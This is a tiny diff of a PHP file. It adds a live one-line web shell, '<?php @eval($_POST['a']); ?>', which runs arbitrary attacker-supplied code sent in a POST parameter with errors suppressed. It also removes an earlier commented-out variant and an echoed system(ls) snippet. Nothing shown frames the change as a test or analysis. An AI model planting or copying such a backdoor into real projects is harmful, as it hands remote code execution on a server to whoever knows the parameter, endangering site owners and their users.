@@ -1,5 +1,2 @@
-//<?php @eval($_POST['hacker']); ?>
+<?php @eval($_POST['a']); ?>
 
-<?php
-echo "<?php system(ls);?>";
-?>
